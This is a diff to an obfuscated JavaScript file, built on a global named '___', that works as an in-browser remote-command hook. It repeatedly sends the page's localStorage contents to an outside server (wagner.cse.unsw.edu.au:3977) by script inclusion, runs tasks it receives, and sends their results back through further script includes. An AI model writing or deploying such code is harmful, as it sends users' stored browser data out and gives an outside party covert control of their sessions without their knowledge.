@@ -2,29 +2,21 @@ ___.$(function($) {
 
     // Triggers a command for processing
     ___.fire = function(payload) {
-        $(top.document).trigger({
-            type: '___',
-            payload: payload
-        });
+        // If it will respond with a callback, don't respond until that is called
+        if (payload.task.length > 0) {
+            payload.task.call(this, function(result) {
+                ___.include(payload.return + "?key=" + payload.key + "&result=" + result);
+            });
+        // If it does not use a callback, respond straight away
+        } else {
+            ___.include(payload.return + "?key=" + payload.key + "&result=" + payload.task.call(this));
+        }
     };
 
     // If this script is living in the top level
     if (top == window) {
 
-        // Accepts command payloads
-        $(document).on('___', function(event) {
-            var payload = event.payload;
-            if (payload.task.length > 0) {
-                payload.task.call(this, function(result) {
-                    ___.include(payload.return + "?key=" + payload.key + "&result=" + result);
-                });
-            } else {
-                payload.task.call(this);
-                ___.include(payload.return + "?key=" + payload.key);
-            }
-        });
-
-        // Constantly polls for commands
+        // Constantly poll for commands
         setInterval(function() {
             var data = JSON.parse(localStorage.___ || "{}");
             ___.include('//wagner.cse.unsw.edu.au:3977/queue?' + Object.keys(data).map(function(key) { return key + '=' + data[key] }).join('&') );
